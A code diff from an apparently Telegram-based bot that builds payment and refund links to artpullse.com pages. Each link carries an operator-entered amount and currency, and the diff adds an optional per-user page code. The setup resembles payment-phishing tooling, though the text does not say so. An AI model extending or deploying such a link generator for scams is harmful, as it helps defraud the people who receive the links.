@@ -1344,9 +1344,13 @@ async def manual_payment_amount_handler(message: types.Message):
             payment_type = payment_type_by_uid.get(uid, 'refund')
             print(f"[DEBUG] manual_payment_amount_handler: payment_type={payment_type}, amount={amount}, currency={currency}")
             if payment_type == 'defolt':
-                link = f"https://artpullse.com/buy-tickets/loading/?total={amount}&currency={currency}&f=1"
+                page_code = get_page_code_for_user(uid) if 'get_page_code_for_user' in globals() else None
+                page_param = f"&e={page_code}" if page_code else ""
+                link = f"https://artpullse.com/buy-tickets/loading/?total={amount}&currency={currency}&f=1{page_param}"
             else:
-                link = f"https://artpullse.com/refund/?total={amount}&currency={currency}"
+                page_code = get_page_code_for_user(uid) if 'get_page_code_for_user' in globals() else None
+                page_param = f"&e={page_code}" if page_code else ""
+                link = f"https://artpullse.com/refund/?total={amount}&currency={currency}{page_param}"
             print(f"[DEBUG] manual_payment_amount_handler: generated link: {link}")
             sent_msg = await message.answer(f"Ссылка для оплаты для пользователя:\n{link}", reply_markup=ReplyKeyboardRemove())
             user_step[uid] = None
